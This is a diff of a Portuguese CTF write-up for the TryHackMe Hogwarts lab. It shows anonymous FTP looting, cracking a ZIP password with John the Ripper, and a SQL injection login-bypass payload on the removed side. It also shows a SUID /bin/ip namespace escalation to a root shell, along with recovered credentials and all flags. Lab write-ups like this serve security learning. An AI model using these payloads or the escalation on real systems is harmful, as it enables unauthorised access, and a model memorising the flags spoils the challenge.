@@ -1,9 +1,7 @@
 # ⚡ CTF Hogwarts - Writeup Completo (TryHackMe)
 
-**Data:** 27 de Abril de 2026  
-**Alvo:** `10.10.212.163`  
-**Atacante:** Murilo (root@ip-10-10-153-170)  
-**Status:** PWNED (Privilégio Root Obtido)
+**Data:** 18 de Abril de 2026  
+**Alvo:** `10.10.212.163` 
 
 ---
 
@@ -33,119 +31,349 @@ PORT      STATE SERVICE VERSION
 O scan revelou serviços críticos em portas altas. O FTP (10255) permitia login anônimo e a porta 9736 rodava um servidor PHP, indicando vetores de entrada via exfiltração e web.
 
 ---
+## 2. Exploração de FTP e Exfiltração (com saída dos comandos)
 
-## 2. Exploração de FTP e Exfiltração
+Acesso ao FTP anônimo na porta **10255**, listagem de diretórios ocultos (`...`) e download dos arquivos encontrados.
 
-Exploramos o FTP anônimo para buscar arquivos sensíveis. Encontramos diretórios ocultos usando nomes com múltiplos pontos (`...`).
-
-**Comandos:**
-```bash
-ftp 10.10.212.163 10255
-# Login: anonymous | Password: [vazio]
-
-ftp> ls -la
-ftp> get .IamHidden
-ftp> cd ...
+**Sessão FTP (listagem e downloads):**
+```text
+drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
+drwxr-xr-x    2 ftp      ftp          4096 Apr 27 09:04 ...
+-rw-r--r--    1 ftp      ftp           105 Sep 06  2020 GoAway.exe
+226 Directory send OK.
 ftp> get GoAway.exe
+local: GoAway.exe remote: GoAway.exe
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for GoAway.exe (105 bytes).
+226 Transfer complete.
+105 bytes received in 0.00 secs (163.5392 kB/s)
 ftp> cd ...
-ftp> get .I_saved_it_harry.zip
+250 Directory successfully changed.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Apr 27 09:04 .
+drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
+-rw-r--r--    1 ftp      ftp           231 Apr 27 09:04 .I_saved_it_harry.zip
+-rw-r--r--    1 ftp      ftp           157 Sep 06  2020 note4neville
+226 Directory send OK.
 ftp> get note4neville
+local: note4neville remote: note4neville
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note4neville (157 bytes).
+226 Transfer complete.
+157 bytes received in 0.00 secs (358.2250 kB/s)
+ftp> get .I_saved_it_harry.zip
+local: .I_saved_it_harry.zip remote: .I_saved_it_harry.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .I_saved_it_harry.zip (231 bytes).
+226 Transfer complete.
+231 bytes received in 0.00 secs (4.5896 MB/s)
+ftp> exit
+221 Goodbye.
 ```
 
-**Análise dos Arquivos:**
+**Leitura dos arquivos baixados (fora do FTP):**
 ```bash
 cat note4neville
-# Hagrid: Oi Neville even I ws able to open your secret file!
-
+cat .IamHidden
 cat GoAway.exe
-# Hagrid: Oh no harry, y'are steell poking injections around 'ere aren't ya?
+```
+
+**Saída:**
+```text
+root@ip-10-10-153-170:~# cat note4neville 
+Hagrid: Oi Neville even I ws able to open your secret file!  Yeah now change it before someone gets in. These are troubled times, I tell ya 'roubled imes.!!
+
+root@ip-10-10-153-170:~# cat .IamHidden 
+Hagrid: You just don't understand do you? shoooooooo Go away! this is prolly a ded end!.. huh 
+
+root@ip-10-10-153-170:~# cat GoAway.exe 
+Hagrid: Oh no harry, y'are steell poking injections around 'ere aren't ya? Go away 'arry, me tellin' ya.
 ```
 
 **Raciocínio:**  
-O arquivo `note4neville` sugeriu que Neville possuía segredos no servidor. Já o `GoAway.exe` continha uma dica direta de SQL Injection, apontando para a vulnerabilidade do serviço web.
+- O diretório `...` indicou conteúdo escondido no FTP.  
+- `GoAway.exe` trouxe a dica explícita de **injections** → forte indicação de **SQL Injection** na aplicação web.  
+- `note4neville` apontou que o Neville tinha um “secret file” (pista de credenciais).
 
 ---
 
-## 3. Quebra de Criptografia do ZIP
+## 3. Quebra de senha do ZIP (com saída dos comandos)
 
-O arquivo `.I_saved_it_harry.zip` estava protegido por senha. Realizamos brute-force no hash para extrair a credencial.
+Tentativa de extração do ZIP revelou que ele estava protegido por senha.
+
+**Comando:**
+```bash
+unzip .I_saved_it_harry.zip
+```
+
+**Saída:**
+```text
+Archive:  .I_saved_it_harry.zip
+[.I_saved_it_harry.zip] boot/.pass password:
+```
+
+Como o `fcrackzip` não estava instalado, foi usado o **John the Ripper** com `zip2john`.
 
 **Comandos:**
 ```bash
 zip2john .I_saved_it_harry.zip > zip.hash
-
+cat zip.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
-# Resultado: anime (.I_saved_it_harry.zip/boot/.pass)
+```
 
+**Saídas:**
+```text
+root@ip-10-10-153-170:~# zip2john .I_saved_it_harry.zip > zip.hash
+ver 1.0 efh 5455 efh 7875 .I_saved_it_harry.zip/boot/.pass PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=6229389F type=0
+
+root@ip-10-10-153-170:~# cat zip.hash 
+.I_saved_it_harry.zip/boot/.pass:$pkzip2$1*2*2*0*2d*21*6229389f*0*44*0*2d*6229*4892*39a9ffdbda932ed28b970953a34b306fbbed3b8c358c79e374b5dc9a6f1c742022423ea88e6ee43793f962bef9*$/pkzip2$:boot/.pass:.I_saved_it_harry.zip::.I_saved_it_harry.zip
+
+root@ip-10-10-153-170:~# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+anime            (.I_saved_it_harry.zip/boot/.pass)
+1g 0:00:00:00 DONE (2026-04-27 10:13) 14.28g/s 58514p/s 58514c/s 58514C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+**Extração do ZIP com a senha obtida e leitura do arquivo `.pass`:**
+```bash
 unzip .I_saved_it_harry.zip
-# Senha: anime
-
 cat boot/.pass
 ```
 
-**Resultado:**
+**Saída:**
 ```text
+root@ip-10-10-153-170:~# unzip .I_saved_it_harry.zip 
+Archive:  .I_saved_it_harry.zip
+[.I_saved_it_harry.zip] boot/.pass password: 
+ extracting: boot/.pass              
+
+root@ip-10-10-153-170:~# cat boot/.pass 
 neville:ocxxbwaznnkzkymq6m7tmdykv
 ```
 
 **Raciocínio:**  
-A quebra do hash revelou a senha `anime`. Com isso, exfiltramos a credencial de acesso SSH para o usuário `neville`.
+A senha do ZIP era `anime`, e o arquivo `boot/.pass` revelou credenciais no formato `user:pass`, permitindo login como **neville** via SSH.
 
 ---
 
-## 4. Exploração Web (SQL Injection)
+## 4. Enumeração Web / Página inicial (com saída)
 
-Acessamos o sistema de login na porta 9736. Com base na dica anterior ("injections"), aplicamos um payload de bypass.
+**Comando:**
+```bash
+curl -s http://10.10.212.163:9736/
+```
 
-**Payload de Login:**
-- **User:** `admin`
-- **Senha:** `admin' or '1'='1'#`
+**Saída (trecho relevante):**
+```html
+<title>Hogwart's Royal Entry</title>
+<form class="panda-form" method="POST" action="login.php">
+...
+<!-- Snape: Had you been in my house, I would've kicked you out for trying to get illegally in Hogwarts..
+ Dumbledore: Ah, Severus, It's not our choice to make. Minerva?
+Minerva: Oh kick them Albus, I have lost my patience.-->
+```
 
 **Raciocínio:**  
-A injeção `' or '1'='1'#` quebra a lógica da query SQL no backend, validando a autenticação sem uma senha real. O source code da página revelou flags e diálogos de lore (Snape/Dumbledore) sobre acessos ilegais a Hogwarts.
+A aplicação tem um formulário que envia para `login.php`. Os comentários no HTML confirmam que o desafio esconde “lore”/pistas no código-fonte.
 
 ---
 
-## 5. Acesso SSH e Escalação de Privilégio
+## 4.1. Gobuster (erro explicado com saída)
 
-Logamos no servidor via SSH na porta 9440 e buscamos vetores de privilégio local.
+**Comando:**
+```bash
+gobuster dir -u http://10.10.212.163:9736/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+```
+
+**Saída:**
+```text
+Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.212.163:9736/e9d1480b-ce63-4bd5-9663-3a28371f6108 => 200 (Length: 5187). To continue please exclude the status code or the length
+```
+
+**Raciocínio:**  
+O servidor responde **200** para páginas inexistentes (soft-404), então o gobuster não consegue diferenciar o que existe do que não existe sem filtrar por **tamanho** (`--exclude-length 5187`) ou usar outra estratégia.
+
+---
+
+## 5. Porta 43768 (serviço custom via Netcat) + tentativa de resposta
+
+**Comando:**
+```bash
+nc 10.10.212.163 43768
+```
+
+**Saída (banner):**
+```text
+My gifts, friend. (format: Gift1 Gift2 Gift3):
+```
+
+**Tentativa 1 (resposta “lore” completa):**
+```text
+Elder_Wand Resurrection_Stone Invisibility_Cloak
+Death cannot be fooled, Only fools ramble with me. Go away before I ban you from my doors for eternity.!!
+Wand Stone Cloak
+```
+
+**Tentativa 2 (resposta abreviada):**
+```text
+Wand Stone Cloak
+Death cannot be fooled, Only fools ramble with me. Go away before I ban you from my doors for eternity.!!
+```
+
+**Raciocínio:**  
+O serviço parece validar uma resposta específica (provavelmente case-sensitive/format). Mesmo “acertando” a ideia, ele recusou — indicando que ou o formato exato é diferente, ou essa porta é só um “distraction service”/pista.
+
+---
+
+## 6. Acesso SSH (com saída)
 
 **Comando:**
 ```bash
 ssh neville@10.10.212.163 -p 9440
-# Password: ocxxbwaznnkzkymq6m7tmdykv
 ```
 
-### Escalação via SUID (binário `ip`)
-
-Identificamos o binário `/bin/ip` com permissão SUID e exploramos o uso de Network Namespaces.
-
-```bash
-neville@ip-10-10-212-163:~$ ip netns add foo
-neville@ip-10-10-212-163:~$ ip netns exec foo /bin/sh -p
-# whoami -> root
+**Saída (trecho):**
+```text
+The authenticity of host '[10.10.212.163]:9440 ([10.10.212.163]:9440)' can't be established.
+...
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-1112-aws x86_64)
 ```
-
-**Raciocínio:**  
-O binário `ip` com o bit SUID permite a execução de comandos como Root. Ao criar um namespace de rede e executar `/bin/sh -p`, a shell herda o Effective UID do Root.
 
 ---
 
-## 6. Captura Final de Flags
+## 7. Enumeração de SUID (com saída)
 
-Com privilégios máximos, realizamos uma busca recursiva por todas as flags no formato padrão `THM{}`.
+**Comando:**
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+**Saída:**
+```text
+/etc/room_of_requirement
+/bin/mount
+/bin/fusermount
+/bin/ping
+/bin/ping6
+/bin/ip
+/bin/umount
+/bin/su
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9804/bin/mount
+/snap/core/9804/bin/ping
+/snap/core/9804/bin/ping6
+/snap/core/9804/bin/su
+/snap/core/9804/bin/umount
+/snap/core/9804/usr/bin/chfn
+/snap/core/9804/usr/bin/chsh
+/snap/core/9804/usr/bin/gpasswd
+/snap/core/9804/usr/bin/newgrp
+/snap/core/9804/usr/bin/passwd
+/snap/core/9804/usr/bin/sudo
+/snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9804/usr/lib/openssh/ssh-keysign
+/snap/core/9804/usr/lib/snapd/snap-confine
+/snap/core/9804/usr/sbin/pppd
+```
+
+**Raciocínio:**  
+O destaque aqui é o `/bin/ip` com SUID, que frequentemente permite abusos com **network namespaces** para obter shell privilegiada.
+
+---
+
+## 8. Privilégio Root via `/bin/ip` (com saída)
+
+**Comandos:**
+```bash
+ip netns add foo
+ip netns exec foo /bin/sh -p
+```
+
+**Saída:**
+```text
+neville@ip-10-10-212-163:~$ ip netns add foo
+neville@ip-10-10-212-163:~$ ip netns exec foo /bin/sh -p
+# whoami
+root
+```
+
+---
+
+## 9. Binário SUID custom `/etc/room_of_requirement` (extração de pista)
+
+**Comando:**
+```bash
+ls -la /etc/room_of_requirement
+```
+
+**Saída:**
+```text
+---Sr-sr-x 1 root root 17126 Apr 27 09:04 /etc/room_of_requirement
+```
+
+**Comando:**
+```bash
+cat /etc/room_of_requirement
+```
+
+**Saída (trecho relevante encontrado no meio do binário):**
+```text
+Invisibilty cloak: m5ktp!h970#ej0@8ja4hj8l00
+```
+
+---
+
+## 10. Busca final de flags (com saída)
 
 **Comando:**
 ```bash
 grep -rE "THM\{|flag\{" /var /etc /opt /home /root /srv 2>/dev/null
 ```
 
-**Resultados Encontrados:**
-- **Hermione Flag:** `THM{its_wingardium_laviosaa_Ron}`
-- **Harry Flag:** `THM{Yeah_1_swallowed_the_sn1tch.}`
-- **Draco Flag:** `THM{I_unarm3d_dumbled0re}`
+**Saída:**
+```text
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{its_wingardium_laviosaa_Ron}
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{Yeah_1_swallowed_the_sn1tch.}
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{I_unarm3d_dumbled0re}
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
+/var/www/mymainsite/conn.php:        $FLAG = "THM{wait-for-your-letter!}";
+/etc/left_corridor/seventh_floor/.entrance:THM{That-boy-was-Tom-Riddle}
+/home/hermoine/special_spell.txt:THM{its_wingardium_laviosaa_Ron}
+/home/draco/achievements.txt:THM{I_unarm3d_dumbled0re}
+/home/harry/special_spell.txt:THM{Yeah_1_swallowed_the_sn1tch.}
+/root/headmaster.txt:THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
+```
+
+**Resumo das flags extraídas:**
+- **Hermione:** `THM{its_wingardium_laviosaa_Ron}`
+- **Harry:** `THM{Yeah_1_swallowed_the_sn1tch.}`
+- **Draco:** `THM{I_unarm3d_dumbled0re}`
 - **Web Config:** `THM{wait-for-your-letter!}`
 - **Hidden Room:** `THM{That-boy-was-Tom-Riddle}`
+- **Root:** `THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}`
 - **Root Flag:** `THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}`
 
 **Final de Missão:** Hogwarts Pwned.
